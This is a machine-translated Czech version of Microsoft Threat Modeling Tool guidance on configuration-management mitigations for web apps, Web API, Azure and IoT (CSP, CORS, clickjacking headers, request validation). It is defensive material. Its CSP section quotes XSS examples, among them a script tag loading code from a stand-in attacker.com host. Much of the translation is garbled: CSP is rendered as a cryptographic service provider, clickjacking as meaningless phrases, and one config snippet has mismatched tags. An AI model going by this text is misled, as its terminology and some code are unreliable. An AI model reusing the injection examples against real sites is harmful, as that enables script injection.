---
title: Konfigurace správy – nástroj pro modelování hrozeb Microsoftu – Azure | Dokumentace Microsoftu
description: zmírnění rizik pro hrozby v nástroj pro modelování hrozeb
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 254c68c45a06022588ade6ab6f005989205ff405
ms.sourcegitcommit: 7b845d3b9a5a4487d5df89906cc5d5bbdb0507c8
ms.translationtype: MT
ms.contentlocale: cs-CZ
ms.lasthandoff: 08/14/2018
ms.locfileid: "42055240"
---
# <a name="security-frame-configuration-management--mitigations"></a>Zabezpečení Frame: Správa konfigurace | Zmírnění rizik 
| Produkt nebo službu | Článek |
| --------------- | ------- |
| **Webové aplikace** | <ul><li>[Implementace obsahu zabezpečení zásady (CSP) a zakažte vložený javascript](#csp-js)</li><li>[Povolit filtr XSS v prohlížeči](#xss-filter)</li><li>[Aplikace ASP.NET musíte zakázat trasování a ladění před nasazením](#trace-deploy)</li><li>[JavaScript třetích stran přístup pouze z důvěryhodných zdrojů](#js-trusted)</li><li>[Ujistěte se, že ověřeného stránek ASP.NET začlenit nápravu uživatelského rozhraní nebo opěry pro kliknutí ochrany](#ui-defenses)</li><li>[Ujistěte se, že jsou povolena pouze důvěryhodného zdroje, pokud je povolené CORS na webové aplikace ASP.NET](#cors-aspnet)</li><li>[Povolit ValidateRequest atribut na stránkách ASP.NET](#validate-aspnet)</li><li>[Použijte místně hostované nejnovější verze knihovny jazyka JavaScript](#local-js)</li><li>[Zakázat automatické sledování toku dat MIME](#mime-sniff)</li><li>[Odebrání hlaviček standardní serveru na Windows Azure Web Sites, aby otisků](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Konfigurace brány Windows Firewall pro přístup k databázi](#firewall-db)</li></ul> |
| **Webové rozhraní API** | <ul><li>[Ujistěte se, že jsou povolena pouze důvěryhodného zdroje, pokud je povolené CORS na rozhraní ASP.NET Web API](#cors-api)</li><li>[Šifrování oddíly konfiguračních souborů rozhraní Web API, které obsahují citlivá data](#config-sensitive)</li></ul> |
| **Zařízení IoT** | <ul><li>[Ujistěte se, že všechny správce rozhraní jsou zabezpečené pomocí silné přihlašovací údaje](#admin-strong)</li><li>[Ujistěte se, že neznámý kód nelze spustit na zařízeních](#unknown-exe)</li><li>[Šifrování operačního systému a další oddíly zařízení IoT s bit schránky](#partition-iot)</li><li>[Ujistěte se, že jsou povolené jenom minimální služby/funkce na zařízeních](#min-enable)</li></ul> |
| **Brána IoT pole** | <ul><li>[Šifrování operačního systému a další oddíly hraniční brána IoT s bit schránky](#field-bit-locker)</li><li>[Ujistěte se, že výchozí přihlašovací údaje ze brána pole se změní při instalaci](#default-change)</li></ul> |
| **Brána IoT cloudu** | <ul><li>[Ujistěte se, že Cloudová brána implementuje proces aktualizovat firmware připojená zařízení](#cloud-firmware)</li></ul> |
| **Hranice vztahů důvěryhodnosti počítače** | <ul><li>[Ujistěte se, že zařízení mají kontrolních mechanismů pro zabezpečení koncový bod nakonfigurovaný podle organizační zásady](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zajistěte zabezpečenou správu přístupových klíčů k úložišti Azure](#secure-keys)</li><li>[Ujistěte se, že jsou povolena pouze důvěryhodného zdroje, pokud je povolené CORS v Azure storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Povolení služby WCF pro omezení funkce](#throttling)</li><li>[WCF informacím pomocí metadat](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementace obsahu zabezpečení zásady (CSP) a zakažte vložený javascript

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Úvod do zásad zabezpečení obsahu](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referenční příručce o zásadách zabezpečení obsahu](http://content-security-policy.com/), [funkce zabezpečení](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Úvod do zásad zabezpečení obsahu](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Můžete použít zprostředkovatele kryptografických služeb?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroky** | <p>Obsahu zabezpečení zásady (CSP) je v obrany zabezpečení mechanismus, W3C standard, umožňující vlastníci webové aplikace mít ovládací prvek na obsah vložený v lokalitě. Zprostředkovatel kryptografických služeb se přidá jako hlavičku HTTP odpovědi na webovém serveru a na straně klienta vynucuje prohlížeče. Je zásady založené na seznamu povolených IP adres – web lze deklarovat sadu důvěryhodných domén, ze které aktivní obsah, jako je JavaScript je možné načíst.</p><p>Zprostředkovatel kryptografických služeb poskytuje následující výhody:</p><ul><li>**Ochrana proti skriptování mezi servery:** Pokud je stránka ohroženy XSS, útočník ho může zneužít 2 způsoby:<ul><li>Vložit `<script>malicious code</script>`. Napadený nebude fungovat kvůli Base CSP omezení-1</li><li>Vložit `<script src=”http://attacker.com/maliciousCode.js”/>`. Napadený nebude fungovat, protože útočník řídit domény nesmí být v seznamu povolených IP adres CSP domén</li></ul></li><li>**Kontrolu nad průsak dat ven:** Pokud žádný škodlivý obsah na webové stránce pokusí připojit k externí web a krádeži dat, připojení se přeruší poskytovatel CSP. Důvodem je, že cílové domény nesmí být v seznamu povolených IP adres zprostředkovatele kryptografických služeb.</li><li>**Obrana proti opěry pro kliknutí:** opěry pro klikněte na tlačítko je útoku techniku, pomocí které může nežádoucí osoba rámec originální webu a vynutit uživatelé kliknout na prvky uživatelského rozhraní. Aktuálně obranu proti opěry pro kliknutí dosáhnete pomocí konfigurace odpověď záhlaví X-Frame-Options. Ne všechny prohlížeče nerespektují toto záhlaví a přejdete vpřed CSP bude standardní způsob, jak chránit před opěry pro klikněte na</li><li>**Vytváření sestav v reálném čase útoku:** při útoku prostřednictvím injektáže na webu s podporou poskytovatele CSP prohlížeče se automaticky aktivuje oznámení koncovým bodem nakonfigurovaným na webový server. Tímto způsobem CSP slouží jako výstražný systém v reálném čase.</li></ul> |

### <a name="example"></a>Příklad:
Příklad zásady: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Tyto zásady umožňují skriptů pro načtení pouze ze serveru a google analytics server webové aplikace. Skripty načtené z jiné lokality budou odmítnuty. Pokud zprostředkovatele kryptografických služeb je povoleno na webu, následující funkce jsou automaticky zakázány útoky XSS zmírnit. 

### <a name="example"></a>Příklad:
Vložené skripty nebude spuštěno. Následují příklady vložených skriptech 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Příklad:
Řetězce nebude vyhodnocen jako kód. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Povolit filtr XSS v prohlížeči

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Filtr ochrany skriptování mezi weby](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Kroky** | <p>Konfigurace hlavičky X-XSS ochrany odpovědi Určuje filtr skriptu prohlížeče mezi weby. Tato hlavička odpovědi může mít následující hodnoty:</p><ul><li>`0:` Tato akce zakáže filtr</li><li>`1: Filter enabled` Pokud se zjistí s útoky skriptování napříč weby, pokud chcete zastavit útoku, bude sanitizujte prohlížeče na stránce</li><li>`1: mode=block : Filter enabled`. Spíše než sanitizujte stránce při zjištění útoku XSS, prohlížeč, nebude moct vykreslení stránky</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Prohlížeč bude sanitizujte stránky a ohlásit narušení.</li></ul><p>Toto je funkce chromu využitím CSP porušení zprávy k odeslání podrobností na identifikátor URI podle vašeho výběru. Poslední 2 možnosti jsou považovány za bezpečné hodnoty.</p>|

## <a id="trace-deploy"></a>Aplikace ASP.NET musíte zakázat trasování a ladění před nasazením

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Přehled ladění ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [trasování – Přehled technologie ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [postupy: Povolení trasování pro aplikaci ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [postupy: povolení ladění pro aplikace ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroky** | Když je povoleno trasování pro stránku, každý prohlížeče požadování že také získá informace o trasování, který obsahuje data o stav vnitřní serveru a pracovní postup. Tyto informace může být citlivé na zabezpečení. Při ladění je povoleno pro stránky, způsobit chyby děje na serveru data trasování plného zásobníku zobrazí v prohlížeči. Tato data může zveřejnit citlivé na zabezpečení informace o pracovní postup serveru. |

## <a id="js-trusted"></a>JavaScript třetích stran přístup pouze z důvěryhodných zdrojů

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | třetí strany JavaScripty by měla odkazovat pouze z důvěryhodných zdrojů. Koncové body odkaz musí být vždy o protokolu SSL. |

## <a id="ui-defenses"></a>Ujistěte se, že ověřeného stránek ASP.NET začlenit nápravu uživatelského rozhraní nebo opěry pro kliknutí ochrany

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Klikněte na tlačítko-opěry pro list Ošidit Defense OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [interní informace aplikace Internet Explorer - boji proti opěry pro klikněte na tlačítko s X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Kroky** | <p>Opěry pro kliknutí, označované také jako "uživatelské rozhraní nápravu útok", je když útočník pomocí více vrstev průhledného nebo neprůhledného přimět uživatele kliknutím na tlačítko nebo odkaz na jiné stránce, když byly hodláte na nejvyšší úrovni stránky.</p><p>Toto rozvrstvení se dosahuje tím, že vytvoří škodlivé stránky pomocí elementu iframe, který načte stránku napadené. Díky tomu se útočník "zneužívá" kliknutí určené pro jejich stránku a směrování na jinou stránku, pravděpodobně vlastněn jinou aplikaci, domény nebo obojí. Aby se zabránilo útokům opěry pro klikněte na tlačítko, nastavte správné hlavičky odpovědi HTTP X-Frame-Options, které dáte pokyn, aby prohlížeč, aby rámce z jiných domén</p>|

### <a name="example"></a>Příklad:
Hlavička X-FRAME-OPTIONS se dá nastavit prostřednictvím web.config služby IIS. Fragment kódu pro servery, které by měly být nikdy ohraničeny Web.config: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Příklad:
Soubor Web.config kód lokality, které by měly být pouze ohraničeny pomocí stránek ve stejné doméně: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Ujistěte se, že jsou povolena pouze důvěryhodného zdroje, pokud je povolené CORS na webové aplikace ASP.NET

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Webové formuláře, MVC5 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásada stejného zdroje a brání škodlivým webům ve čtení citlivých dat z jiné lokality. Ale někdy to může být požádán o bezpečně vystavit rozhraní API pro jiné weby, které můžou využívat. Křížové sdílení prostředků zdroji (CORS) je standard W3C, která umožňuje server zmírnit zásadu stejného zdroje. Pomocí CORS, server explicitně můžou některé požadavky cross-origin zatímco jiné odmítnout.</p><p>CORS je bezpečnější a flexibilnější, než starší techniky, jako je například JSONP. Ve své podstatě povolení CORS se přeloží na přidání několika hlavičky HTTP odpovědi (Access - Control-*) do webové aplikace a to lze provést několika způsoby.</p>|

### <a name="example"></a>Příklad:
Pokud je k dispozici přístup k souboru Web.config, CORS je možné přidat prostřednictvím následující kód: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Příklad:
Pokud přístup k souboru web.config není k dispozici, je tak, že přidáte následující kód CSharp nakonfigurovat CORS: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Mějte prosím na paměti, že je důležité zajistit, že seznam původů v atributu "Access-Control-Allow-Origin" je nastavena na konečnou sadu důvěryhodných zdrojů. Selhání neoprávněně nastavit tuto konfiguraci (například nastavení hodnoty jako "*") vám umožní škodlivé weby k aktivaci požadavky mezi zdroji do webové aplikace > bez jakýchkoli omezení, což zranitelný vůči útokům CSRF aplikace. 

## <a id="validate-aspnet"></a>Povolit ValidateRequest atribut na stránkách ASP.NET

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Webové formuláře, MVC5 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Ověření požadavku – obrana před Skriptovými útoky](http://www.asp.net/whitepapers/request-validation) |
| **Kroky** | <p>Ověření požadavku, která je součástí technologie ASP.NET od verze 1.1, zabrání serveru přijetí obsahu obsahující bez kódování HTML. Tato funkce je určena k zabránění útoků prostřednictvím injektáže skriptu kterým kód skriptu klienta nebo HTML lze neúmyslně odeslané na server, ukládat a předloží ostatním uživatelům. Stále důrazně doporučujeme, že ověření všech vstupních dat a to v případě potřeby použije kódování HTML.</p><p>Žádost o ověření se provádí pomocí porovnávání veškerá vstupní data do seznamu potenciálně nebezpečné hodnoty. Pokud je nalezena shoda, vyvolá ASP.NET `HttpRequestValidationException`. Žádost o ověření funkce je ve výchozím nastavení povolená.</p>|

### <a name="example"></a>Příklad:
Tuto funkci však můžete zakázat na úrovni stránky: 
```XML
<%@ Page validateRequest="false" %> 
```
nebo na úrovni aplikace 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Poznámka: tuto funkci žádost o ověření není podporován a není součástí MVC6 kanálu. 

## <a id="local-js"></a>Použijte místně hostované nejnovější verze knihovny jazyka JavaScript

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | <p>Vývojáři, kteří používají standardní knihovny jazyka JavaScript, jako je nutné použít JQuery schválené verze běžných knihoven jazyka JavaScript, které neobsahují chyby zabezpečení. Dobrým postupem je použití nejvíce nejnovější verzi knihovny, protože obsahují opravy zabezpečení pro známých slabých míst v jejich starší verze.</p><p>Pokud se nedá použít nejnovější verzi z důvodů kompatibility nižší než minimální verze by měla sloužit.</p><p>Přijatelné minimálních verzích:</p><ul><li>**jQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery ověření 1.9</li><li>JQuery Mobile 1.0.1</li><li>jQuery 2.99 cyklu</li><li>jQuery 1.9.0 DataTables</li></ul></li><li>**Sada nástrojů AJAX Control Toolkit**<ul><li>Sada nástrojů AJAX Control Toolkit 40412</li></ul></li><li>**Webové formuláře ASP.NET a Ajax**<ul><li>Webové formuláře ASP.NET a Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nikdy načíst jakékoli knihovny JavaScriptu z externích webů, jako je například veřejné sítě CDN</p>|

## <a id="mime-sniff"></a>Zakázat automatické sledování toku dat MIME

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Zabezpečení část aplikaci Internet Explorer 8 V: komplexní ochranu](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](http://en.wikipedia.org/wiki/Mime_type) |
| **Kroky** | Hlavička X-Content-typ-Options se hlavičky protokolu HTTP, který umožňuje vývojářům určit, že jejich obsahu by neměly být MIME zachycení. Tato hlavička slouží ke zmírnění útoků MIME pro analýzu sítě. Pro každou stránku, který může obsahovat uživatele řídit obsah, je nutné použít záhlaví HTTP X-obsah-typ-možnosti: nosniff. Pokud chcete povolit požadované záhlaví globálně pro všechny stránky v aplikaci, můžete provést jednu z následujících akcí|

### <a name="example"></a>Příklad:
Přidáte hlavičku v souboru web.config, pokud je aplikace hostovaná pomocí Internetové informační služby (IIS) 7 a vyšší. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Příklad:
Přidat hlavičku prostřednictvím globální aplikace\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Příklad:
Implementace vlastního modulu HTTP 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Příklad:
Požadované záhlaví jen pro konkrétní stránky můžete povolit přidáním do jednotlivých odpovědi: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Odebrání hlaviček standardní serveru na Windows Azure Web Sites, aby otisků

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | EnvironmentType – Azure |
| **Odkazy**              | [Odebrání hlaviček standardní serveru na Windows Azure websites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroky** | Hlavičky, jako je například Server, X-využívá-podle verze X AspNet zobrazit informace o serveru a základním technologiím. Doporučujeme potlačit tyto hlavičky a tím brání otisků aplikace |

## <a id="firewall-db"></a>Konfigurace brány Windows Firewall pro přístup k databázi

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Databáze | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | SQL Azure, OnPrem |
| **Atributy**              | Není k dispozici, verze SQL - V12 |
| **Odkazy**              | [Jak nakonfigurovat bránu firewall Azure SQL database](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [konfigurovat bránu Windows Firewall pro přístup k databázi](https://msdn.microsoft.com/library/ms175043) |
| **Kroky** | Firewally pomůže zabránit neoprávněnému přístupu k prostředkům počítače. Pro přístup k instanci databázového stroje SQL Server přes bránu firewall, musíte nakonfigurovat bránu firewall na počítači se systémem SQL Server povolí přístup |

## <a id="cors-api"></a>Ujistěte se, že jsou povolena pouze důvěryhodného zdroje, pokud je povolené CORS na rozhraní ASP.NET Web API

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Web API | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | MVC 5 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Povolení žádostí nepůvodního zdroje v rozhraní ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [rozhraní ASP.NET Web API – podpora CORS v rozhraní ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásada stejného zdroje a brání škodlivým webům ve čtení citlivých dat z jiné lokality. Ale někdy to může být požádán o bezpečně vystavit rozhraní API pro jiné weby, které můžou využívat. Křížové sdílení prostředků zdroji (CORS) je standard W3C, která umožňuje server zmírnit zásadu stejného zdroje.</p><p>Pomocí CORS, server explicitně můžou některé požadavky cross-origin zatímco jiné odmítnout. CORS je bezpečnější a flexibilnější, než starší techniky, jako je například JSONP.</p>|

### <a name="example"></a>Příklad:
V App_Start/WebApiConfig.cs přidejte následující kód do metody WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Příklad:
EnableCors atribut lze použít na metody akce v kontroleru: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Mějte prosím na paměti, že je důležité zajistit, že seznam původů EnableCors atributu je nastavena na konečnou sadu důvěryhodných zdrojů. Selhání neoprávněně nastavit tuto konfiguraci (například nastavení hodnoty jako "*") vám umožní škodlivé weby k aktivaci požadavky mezi zdroji do rozhraní API bez jakýchkoli omezení > což zranitelný vůči útokům CSRF rozhraní API. Může být doplněny EnableCors na úrovni kontroleru. 

### <a name="example"></a>Příklad:
K zákazu sdílení CORS na konkrétní metody ve třídě, DisableCors atribut je možné, jak je znázorněno níže: 
```csharp
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Web API | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | MVC 6 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Povolení žádostí nepůvodního zdroje (CORS) v ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroky** | <p>CORS v ASP.NET Core 1.0, může být povoleno pomocí middlewaru nebo pomocí MVC. Při použití MVC k povolení CORS se používají stejné služby CORS, ale není middlewarem CORS.</p>|

**Přístup 1** povolení CORS s middlewarem: Pokud chcete povolit CORS pro celou aplikaci přidejte CORS middleware do kanálu požadavku pomocí metody rozšíření UseCors. Při přidávání middlewarem CORS horizontálních oddílů pomocí třídy CorsPolicyBuilder se dá nastavit zásadu nepůvodního zdroje. Chcete-li to provést dvěma způsoby:

### <a name="example"></a>Příklad:
První je volání UseCors s výraz lambda. Výraz lambda přebírá objekt CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Příklad:
Druhým je definovat jeden nebo více s názvem zásady CORS a pak vyberte zásady podle názvu v době běhu. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Přístup 2** povolení CORS v MVC: vývojáři mohou také pomocí MVC použít konkrétní CORS na akce na kontroler nebo globálně pro všechny řadiče.

### <a name="example"></a>Příklad:
Za akci: K určení CORS zásady pro konkrétní akci, přidejte atribut [EnableCors] na akci. Zadejte název zásady. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Příklad:
Na kontroler: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Příklad:
Globálně: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Mějte prosím na paměti, že je důležité zajistit, že seznam původů EnableCors atributu je nastavena na konečnou sadu důvěryhodných zdrojů. Selhání neoprávněně nastavit tuto konfiguraci (například nastavení hodnoty jako "*") vám umožní škodlivé weby k aktivaci požadavky mezi zdroji do rozhraní API bez jakýchkoli omezení > což zranitelný vůči útokům CSRF rozhraní API. 

### <a name="example"></a>Příklad:
K zákazu sdílení CORS pro kontroler nebo akce, pomocí atributu [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Šifrování oddíly konfiguračních souborů rozhraní Web API, které obsahují citlivá data

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Web API | 
| **SDL fáze**               | Nasazení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Postupy: Šifrování konfigurační oddíly funkce v ASP.NET 2.0 pomocí DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [určení konfigurace poskytovatele chráněné](https://msdn.microsoft.com/library/68ze1hb2.aspx), [pomocí služby Azure Key Vault k ochraně tajných klíčů aplikací](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Kroky** | Konfigurační soubory, například jako soubor Web.config, appsettings.json se často používají k uložení citlivé informace, včetně uživatelská jména, hesla, připojovací řetězce databáze a šifrovací klíče. Pokud tyto informace not protect, vaše aplikace je zranitelný vůči útočníci nebo uživatelé se zlými úmysly získání citlivé informace, jako je například účet uživatelská jména a hesla, názvy databáze a názvy serverů. Podle typu nasazení (azure nebo v místním prostředí), Zašifrujte citlivá části konfigurační soubory pomocí rozhraní DPAPI nebo službám, jako je Azure Key Vault. |

## <a id="admin-strong"></a>Ujistěte se, že všechny správce rozhraní jsou zabezpečené pomocí silné přihlašovací údaje

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Nasazení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Jakékoli rozhraní pro správu, které zpřístupňuje brány zařízení nebo pole by měly být zabezpečeny pomocí silné přihlašovací údaje. Navíc všechny vystavené rozhraní, jako jsou Wi-Fi, SSH, sdílené složky, FTP by měly být zabezpečeny s silné přihlašovací údaje. Výchozí Slabá hesla se nesmí používat. |

## <a id="unknown-exe"></a>Ujistěte se, že neznámý kód nelze spustit na zařízeních

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Povolení zabezpečeného spouštění a bit locker šifrování zařízení na Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Kroky** | Zabezpečené spouštění UEFI omezuje systému umožňuje pouze podepsána zadaným autoritou binárních souborů. Tato funkce brání neznámý kód spuštěn na platformě a potenciálně oslabení stav zabezpečení ho. Povolení zabezpečeného spouštění UEFI a omezit seznam certifikačních autorit, které jsou důvěryhodné pro podepisování kódu. Podepište veškerý kód, který je nasazený na zařízení pomocí jedné z důvěryhodné autority. |

